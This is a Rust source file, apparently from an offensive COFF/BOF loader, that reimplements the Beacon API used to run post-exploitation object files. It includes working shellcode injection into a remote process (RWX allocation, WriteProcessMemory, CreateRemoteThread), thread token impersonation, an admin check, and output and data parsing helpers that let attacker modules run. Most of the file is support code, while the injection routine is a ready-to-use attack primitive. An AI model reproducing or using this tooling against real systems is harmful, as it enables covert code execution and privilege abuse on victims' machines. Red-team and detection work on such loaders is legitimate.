#![allow(non_snake_case)]

use windows_sys::Win32::{
    Foundation::{CloseHandle, HANDLE}, 
    Security::{
        GetTokenInformation, RevertToSelf, 
        TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY
    }, 
    System::{
        Diagnostics::Debug::WriteProcessMemory, 
        Memory::{
            VirtualAllocEx, MEM_COMMIT, 
            MEM_RESERVE, PAGE_EXECUTE_READWRITE
        }, 
        Threading::{
            CreateRemoteThread, GetCurrentProcess, OpenProcess, 
            OpenProcessToken, SetThreadToken, LPTHREAD_START_ROUTINE, 
            PROCESS_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, 
            STARTUPINFOA
        }
    }
};

use {
    super::error::CoffeeLdrError,
    std::{
        fmt,
        alloc::Layout,
        ffi::{c_void, CStr},
        ptr::{null_mut, null, self},
        os::raw::{c_char, c_int, c_short}, 
    },
};

#[allow(dead_code)]
const CALLBACK_OUTPUT: u32 = 0x0;
#[allow(dead_code)]
const CALLBACK_OUTPUT_OEM: u32 = 0x1e;
#[allow(dead_code)]
const CALLBACK_ERROR: u32 = 0x0d;
#[allow(dead_code)]
const CALLBACK_OUTPUT_UTF8: u32 = 0x20;

/// Buffer for storing beacon output.
static mut BEACON_BUFFER: BeaconOutputBuffer = BeaconOutputBuffer::new();

/// A buffer used for managing and collecting output for the beacon.
#[repr(C)]
#[derive(Debug, Clone)]
pub struct BeaconOutputBuffer {
    /// Internal buffer that stores the output data as a vector of `c_char`.
    pub buffer: Vec<c_char>,
}

impl BeaconOutputBuffer {
    /// Creates a new, empty `BeaconOutputBuffer`.
    ///
    /// # Returns
    /// 
    /// - `Self`: A new instance of `BeaconOutputBuffer` with an empty internal buffer. 
    const fn new() -> Self {
        BeaconOutputBuffer {
            buffer: Vec::new(),
        }
    }

    /// Appends a raw C-style string to the buffer.
    ///
    /// # Arguments
    /// 
    /// - `s`: A pointer to a C-style string (`c_char`).
    /// - `len`: The length of the string to append.
    fn append_char(&mut self, s: *mut c_char, len: c_int) {
        if s.is_null() || len <= 0 {
            return;
        }
        let tmp = unsafe { std::slice::from_raw_parts(s, len as usize) };
        self.buffer.extend_from_slice(tmp);
    }

    /// Appends a Rust `&str` to the buffer.
    ///
    /// # Arguments
    /// 
    /// - `s`: A reference to a Rust string slice (`&str`).
    fn append_string(&mut self, s: &str) {
        self.buffer.extend(s.bytes().map(|b| b as c_char));
    }

    /// Retrieves the current buffer and its size, then clears it.
    ///
    /// # Returns
    /// 
    /// A tuple containing:
    /// - A pointer to the buffer (`*mut c_char`).
    /// - The size of the buffer (`usize`). 
    fn get_output(&mut self) -> (*mut c_char, usize) {
        let size = self.buffer.len();
        let ptr = self.buffer.as_mut_ptr();
        self.buffer.clear(); 
        (ptr, size)
    }
}

impl fmt::Display for BeaconOutputBuffer {
    /// Converts the internal buffer into a Rust `String`.
    ///
    /// # Returns
    /// 
    /// A `String` containing the formatted output from the buffer.
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let string = self.buffer
            .iter()
            .map(|&c| if c as u8 == 0 { '\n' } else { c as u8 as char })
            .collect::<String>();
        write!(f, "{}", string)
    }
}

#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct Data {
    /// The original buffer [so we can free it]
    original: *mut c_char,
    
    /// Current pointer into our buffer
    buffer: *mut c_char,

    /// Remaining length of data 
    length: c_int,
    
    /// Total size of this buffer
    size: c_int
}

#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct Format {
    /// The original buffer [so we can free it]
    original: *mut c_char,
    
    /// Current pointer into our buffer
    buffer: *mut c_char,

    /// Remaining length of data 
    length: c_int,
    
    /// Total size of this buffer
    size: c_int
}

/// Retrieves the internal address of a function by name.
///
/// # Arguments
///
/// - `name`: The name of the function whose address is being retrieved.
///
/// # Returns
///
/// - `Ok(usize)`: containing the function's address, or `Err(CoffeeLdrError)`
///   if the function is not found. 
pub fn get_function_internal_address(name: &str) -> Result<usize, CoffeeLdrError> {
    match name {
        // Output
        "BeaconPrintf" => Ok(BeaconPrintf as usize),
        "BeaconOutput" => Ok(BeaconOutput as usize),
        "BeaconGetOutputData" => Ok(BeaconGetOutputData as usize),
        
        // Token
        "BeaconIsAdmin" => Ok(BeaconIsAdmin as usize),
        "BeaconUseToken" => Ok(BeaconUseToken as usize),
        "BeaconRevertToken" => Ok(BeaconRevertToken as usize),
        
        // Format
        "BeaconFormatInt" => Ok(BeaconFormatInt as usize),
        "BeaconFormatFree" => Ok(BeaconFormatFree as usize),
        "BeaconFormatAlloc" => Ok(BeaconFormatAlloc as usize),
        "BeaconFormatReset" => Ok(BeaconFormatReset as usize),
        "BeaconFormatPrintf" => Ok(BeaconFormatPrintf as usize),
        "BeaconFormatAppend" => Ok(BeaconFormatAppend as usize),
        "BeaconFormatToString" => Ok(BeaconFormatToString as usize),

        // Process and injection-related operations
        "BeaconGetSpawnTo" => Ok(BeaconGetSpawnTo as usize),
        "BeaconInjectProcess" => Ok(BeaconInjectProcess as usize),
        "BeaconCleanupProcess" => Ok(BeaconCleanupProcess as usize),
        "BeaconSpawnTemporaryProcess" => Ok(BeaconSpawnTemporaryProcess as usize),
        "BeaconInjectTemporaryProcess" => Ok(BeaconInjectTemporaryProcess as usize),

        // Data
        "BeaconDataInt" => Ok(BeaconDataInt as usize),
        "BeaconDataShort" => Ok(BeaconDataShort as usize),
        "BeaconDataParse" => Ok(BeaconDataParse as usize),
        "BeaconDataLength" => Ok(BeaconDataLength as usize),
        "BeaconDataExtract" => Ok(BeaconDataExtract as usize),

        // Utility functions
        "toWideChar" => Ok(toWideChar as usize),
        "__C_specific_handler" => Ok(0),
        _ =>  Err(CoffeeLdrError::FunctionInternalNotFound(name.to_string()))
    }
}

/// Retrieves the current output buffer and returns a copy of it.
///
/// # Returns
///
/// - `BeaconOutputBuffer`: A cloned copy of the current output buffer.
pub fn get_output_data() -> BeaconOutputBuffer {
    unsafe { BEACON_BUFFER.clone() }
}

/// Allocates a new format buffer with the given size.
///
/// # Arguments
///
/// - `format`: A pointer to the `Format` struct.
/// - `max`: The size of the buffer to allocate.
fn BeaconFormatAlloc(format: *mut Format, max: c_int) {
    if format.is_null() || max == 0 {
        return;
    }

    let layout_result = Layout::from_size_align(max as usize, Layout::new::<i8>().align());
    if let Ok(layout) = layout_result {
        let original = unsafe { std::alloc::alloc_zeroed(layout).cast::<i8>() };
        unsafe {
            (*format).original = original;
            (*format).buffer = original;
            (*format).length = 0;
            (*format).size = max;
        }
    }
}

/// Resets the given format buffer by zeroing it out.
///
/// # Arguments
///
/// - `format`: A pointer to the `Format` struct.
fn BeaconFormatReset(format: *mut Format) {
    if format.is_null() {
        return;
    }

    unsafe {
        ptr::write_bytes((*format).original, 0, (*format).size as usize);
        
        (*format).buffer = (*format).original;
        (*format).length = (*format).size;
    }
}

/// Returns the formatted buffer as a C-style string.
///
/// # Arguments
///
/// - `format`: A pointer to the `Format` struct.
/// - `size`: A pointer to an integer that will hold the size of the buffer.
///
/// # Returns
///
/// - `*mut c_char`: Returns `null` if an error occurs.
fn BeaconFormatToString(format: *mut Format, size: *mut c_int) -> *mut c_char {
    if format.is_null() || size.is_null() {
        return null_mut();
    }

    unsafe {
        (*size) = (*format).length;
        
        (*format).original
    }
}

/// Appends an integer (in big-endian format) to the format buffer.
///
/// # Arguments
///
/// - `format`: A pointer to the `Format` struct.
/// - `value`: The integer to append.
fn BeaconFormatInt(format: *mut Format, value: c_int) {
    if format.is_null() {
        return;
    }

    unsafe {
        if (*format).length + 4 > (*format).size {
            return;
        }
    
        let outdata = swap_endianness(value as u32).to_be_bytes();
        ptr::copy_nonoverlapping(outdata.as_ptr(), (*format).buffer as *mut u8, 4);
    
        (*format).buffer = (*format).buffer.add(4);
        (*format).length += 4;
    }
}

/// Appends raw text data to the format buffer.
///
/// # Arguments
///
/// - `format`: A pointer to the `Format` struct.
/// - `text`: A pointer to the text (`*const c_char`).
/// - `len`: The length of the text.
fn BeaconFormatAppend(format: *mut Format, text: *const c_char, len: c_int) {
    if format.is_null() || text.is_null() || len <= 0 {
        return;
    }

    unsafe {
        if (*format).length + len > (*format).size {
            return;
        }
     
        ptr::copy_nonoverlapping(text, (*format).buffer, len as usize);
        (*format).buffer = (*format).buffer.add(len as usize);
        (*format).length += len;
    }
}

/// Frees the memory allocated for a format buffer.
///
/// # Arguments
///
/// - `format`: A pointer to the `Format` struct.
fn BeaconFormatFree(format: *mut Format) {
    if format.is_null() {
        return;
    }

    unsafe {
        if !(*format).original.is_null() {
            let layout_result = Layout::from_size_align((*format).size as usize, Layout::new::<i8>().align());
            if let Ok(layout) = layout_result {
                std::alloc::dealloc((*format).original as *mut u8, layout);
                (*format).original = null_mut();
            }
        }

        (*format).buffer = null_mut();
        (*format).length = 0;
        (*format).size = 0;
    }
}

/// Formats and appends a string to a `Format` buffer using a format string and arguments.
///
/// # Arguments
/// 
/// - `format`: Pointer to the `Format` struct holding the buffer.
/// - `fmt`: Pointer to the C-style format string (`*const c_char`).
/// - `args`: Variable arguments used in formatting.
#[no_mangle]
unsafe extern "C" fn BeaconFormatPrintf(format: *mut Format, fmt: *const c_char, mut args: ...) {
    if format.is_null() || fmt.is_null() {
        return;
    }

    let fmt_str = CStr::from_ptr(fmt).to_str().unwrap_or("");
    let mut temp_str = String::new();
    
    printf_compat::format(fmt_str.as_ptr() as _, args.as_va_list(), printf_compat::output::fmt_write(&mut temp_str));

    let length_needed = temp_str.len() as c_int;
    if (*format).length + length_needed >= (*format).size {
        return;
    }

    ptr::copy_nonoverlapping(
        temp_str.as_ptr() as *const c_char,
        (*format).buffer.add((*format).length as usize),
        length_needed as usize
    );

    (*format).length += length_needed;
}

/// Extracts a 2-byte short value from the data buffer.
///
/// # Arguments
///
/// - `data`: A pointer to the `Data` struct.
///
/// # Returns
///
/// - `c_short`: Returns 0 if the buffer is too small.
fn BeaconDataShort(data: *mut Data) -> c_short {
    if data.is_null() {
        return 0;
    }

    let parser = unsafe { &mut *data };
    if parser.length < 2 {
        return 0;
    }

    let result = unsafe { ptr::read_unaligned(parser.buffer as *const i16) };
    parser.buffer = unsafe { parser.buffer.add(2) };
    parser.length -= 2;

    result as c_short
}

/// Extracts a 4-byte integer from the data buffer.
/// 
/// # Arguments
/// 
/// - `data`: A pointer to the `Data` struct containing the buffer.
/// 
/// # Returns
/// 
/// - `c_int`: Returns the extracted 4-byte integer. Returns 0 if the buffer is too small or `data` is null.
fn BeaconDataInt(data: *mut Data) -> c_int {
    if data.is_null() {
        return 0;
    }

    let parser = unsafe { &mut *data };
    if parser.length < 4 {
        return 0;
    }

    let result = unsafe { ptr::read_unaligned(parser.buffer as *const i32) };
    parser.buffer = unsafe { parser.buffer.add(4) };
    parser.length -= 4;

    result as c_int
}

/// Extracts a variable-length data buffer from the `Data` struct.
/// 
/// # Arguments
/// 
/// - `data`: A pointer to the `Data` struct containing the buffer.
/// - `size`: A mutable pointer to store the size of the extracted data.
/// 
/// # Returns
/// 
/// - `*mut c_char`: Returns a pointer to the extracted data or `null_mut()` if the buffer is too small or `data` is null. 
fn BeaconDataExtract(data: *mut Data, size: *mut c_int) -> *mut c_char {
    if data.is_null() {
        return null_mut();
    }
    
    let parser= unsafe { &mut *data };
    if parser.length < 4 {
        return null_mut();
    }

    let length = unsafe { ptr::read_unaligned(parser.buffer as *const u32) };
    let outdata = unsafe { parser.buffer.add(4) };
    if outdata.is_null() {
        return null_mut();
    }

    parser.buffer = unsafe { parser.buffer.add(4 + length as usize) };
    parser.length -= 4 + length as c_int;

    if !size.is_null() && !outdata.is_null() {
        unsafe {
            *size = length as c_int;
        }
    }

    outdata as *mut c_char
}

/// Initializes the data parser by setting the buffer and size.
/// 
/// # Arguments
/// 
/// - `data`: A pointer to the `Data` struct to be initialized.
/// - `buffer`: A pointer to the buffer to be parsed.
/// - `size`: The size of the buffer in bytes.
fn BeaconDataParse(data: *mut Data, buffer: *mut c_char, size: c_int) {
    if data.is_null() {
        return;
    }

    unsafe {
        (*data).original = buffer;
        (*data).buffer = buffer.add(4);
        (*data).length = size - 4;
        (*data).size = size - 4;
    }
}

/// Returns the current length of the data buffer.
/// 
/// # Arguments
/// 
/// - `data`: A constant pointer to the `Data` struct.
/// 
/// # Returns
/// 
/// - `c_int`: The remaining length of the buffer. Returns 0 if `data` is null.
fn BeaconDataLength(data: *const Data) -> c_int {
    if data.is_null() {
        return 0;
    }

    unsafe { 
        (*data).length 
    }
}

/// Retrieves the output data and its size from an internal buffer.
/// 
/// # Arguments
/// 
/// - `outsize`: A mutable pointer to store the size of the output data.
/// 
/// # Returns
/// 
/// - `*mut c_char`: A pointer to the output data. Returns `null_mut()` if there is no output.
fn BeaconGetOutputData(outsize: *mut c_int) -> *mut c_char {
    unsafe {
        let (ptr, size) = BEACON_BUFFER.get_output();
    
        if !outsize.is_null() {
            *outsize = size as c_int;
        }
    
        ptr
    }
}

/// Appends output data to an internal buffer.
/// 
/// # Arguments
/// 
/// - `_type`: An integer representing the type of data being output.
/// - `data`: A pointer to the output data.
/// - `len`: The length of the output data.
fn BeaconOutput(_type: c_int, data: *mut c_char, len: c_int) {
    unsafe {
        BEACON_BUFFER.append_char(data, len);
    }
}

/// Prints formatted output to an internal buffer.
/// 
/// # Arguments
/// 
/// - `_type`: The type of output.
/// - `fmt`: A format string.
/// - `args`: Variable arguments list for formatting.
#[no_mangle]
unsafe extern "C" fn BeaconPrintf(_type: c_int, fmt: *mut c_char, mut args: ...) {
    let mut str = String::new();
    printf_compat::format(fmt, args.as_va_list(), printf_compat::output::fmt_write(&mut str));
    str.push('\0');

    BEACON_BUFFER.append_string(&str);
}

/// Reverts the current process token to its original state.
fn BeaconRevertToken() {
    unsafe {
        if RevertToSelf() == 0 {   
            log::warn!("RevertToSelf Failed!")
        }
    }
}

/// Sets the current thread token.
/// 
/// # Arguments
/// 
/// - `token`: A handle to the token to be applied to the current thread.
/// 
/// # Returns
/// 
/// - `i32`: Returns a non-zero value on success, or 0 on failure.
fn BeaconUseToken(token: HANDLE) -> i32 {
    unsafe { SetThreadToken(null_mut(), token) }
}

/// Cleans up a process by closing its handles.
/// 
/// # Arguments
/// 
/// - `info`: A pointer to a `PROCESS_INFORMATION` struct containing the process and thread handles.
fn BeaconCleanupProcess(info: *const PROCESS_INFORMATION) {
    unsafe {
        CloseHandle((*info).hProcess);
        CloseHandle((*info).hThread);
    }
}

/// Checks if the current process is running with elevated privileges (as an admin).
/// 
/// # Returns
/// 
/// - `u32`: Returns 1 if the process is elevated (admin), otherwise 0.
fn BeaconIsAdmin() -> u32 {
    let mut h_token = null_mut();
    
    unsafe {
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut h_token) != 0 { 
            let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
            let mut return_length = 0;

            if GetTokenInformation(
                h_token, 
                TokenElevation, 
                &mut elevation as *mut _ as *mut c_void, 
                size_of::<TOKEN_ELEVATION>() as u32, 
                &mut return_length
            ) != 0 {
                return (elevation.TokenIsElevated == 1) as u32
            }
        }
    }

    0
}

/// Swaps the endianness of a 32-bit unsigned integer.
/// 
/// # Arguments
/// 
/// - `src`: A 32-bit unsigned integer to be converted.
/// 
/// # Returns
/// 
/// - `u32`: The value with swapped endianness.
fn swap_endianness(src: u32) -> u32 {
    // Check if the system is little-endian
    if cfg!(target_endian = "little") {
        // Small-endian to large-endian converter
        src.swap_bytes()
    } else {
        // If it is already big-endian, it returns the original value
        src
    }
}

/// Converts a C-style string to a wide character (UTF-16) string.
/// 
/// # Arguments
/// 
/// - `src`: A pointer to the source C-style string.
/// - `dst`: A pointer to the destination buffer for wide characters.
/// - `max`: The maximum size of the destination buffer in bytes.
/// 
/// # Returns
/// 
/// - `c_int`: Returns 1 on success or 0 on failure. 
fn toWideChar(src: *const c_char, dst: *mut u16, max: c_int) -> c_int {
    if src.is_null() || dst.is_null() || max < size_of::<u16>() as c_int {
        return 0;
    }

    unsafe {
        // Converting the `src` pointer to a C string (`CStr`)
        let c_str = CStr::from_ptr(src);
        
        // Converts CStr to a Rust string (&str)
        if let Ok(str_slice) = c_str.to_str() {

            // Encoding a Rust string as UTF-16
            let utf16_chars: Vec<u16> = str_slice.encode_utf16().collect();
            let dst_slice = std::slice::from_raw_parts_mut(dst, (max as usize) / size_of::<u16>());

            let num_chars = utf16_chars.len();
            if num_chars >= dst_slice.len() {
                return 0; // Not enough space
            }

            // Copy the UTF-16 characters to the destination buffer
            dst_slice[..num_chars].copy_from_slice(&utf16_chars);

            // Adds the null-terminator
            dst_slice[num_chars] = 0;
        }
    }

    1
}

/// Injects a payload into a remote process.
/// 
/// # Arguments
/// 
/// - `_h_process`: A handle to the target process.
/// - `pid`: The process ID of the target process.
/// - `payload`: A pointer to the payload data to be injected.
/// - `len`: The length of the payload.
/// - `_offset`: The offset into the payload.
/// - `_arg`: Additional arguments for the injection.
/// - `_a_len`: Length of the additional arguments.
fn BeaconInjectProcess(_h_process: HANDLE, pid: c_int, payload: *const c_char, len: c_int, _offset: c_char, _arg: *const c_char, _a_len: c_int) {
    if payload.is_null() || len <= 0 {
        return;
    }
    
    unsafe {
        let h_process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 0, pid as u32);
        if h_process.is_null() {
            return;
        }
    
        let address = VirtualAllocEx(h_process, null_mut(), len as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if address.is_null() {
            CloseHandle(h_process);
            return;
        }

        let mut number_of_write = 0;
        if WriteProcessMemory(h_process, address, payload as *const c_void, len as usize, &mut number_of_write) == 0 {
            CloseHandle(h_process);
            return;
        }
    
        let h_thread = CreateRemoteThread(h_process, null(), 0, std::mem::transmute::<*mut c_void, LPTHREAD_START_ROUTINE>(address), null_mut(), 0, null_mut());
        if h_thread.is_null() {
            CloseHandle(h_process);
            return;
        }

        CloseHandle(h_thread);
        CloseHandle(h_process);
    }
}

/// Leaving this to be implemented by people needing/wanting it
fn BeaconInjectTemporaryProcess(_info: *const PROCESS_INFORMATION, _payload: *const c_char, _len: c_int, _offset: c_int, _arg: *const c_char, _a_len: c_int) {
    unimplemented!()
}

/// Leaving this to be implemented by people needing/wanting it
fn BeaconSpawnTemporaryProcess(_x86: i32, _ignore_token: i32, _s_info: *mut STARTUPINFOA, _p_info: *mut PROCESS_INFORMATION) {
    unimplemented!()
}

/// Leaving this to be implemented by people needing/wanting it
fn BeaconGetSpawnTo(_x86: i32, _buffer: *const c_char, _length: c_int) {
    unimplemented!()
}
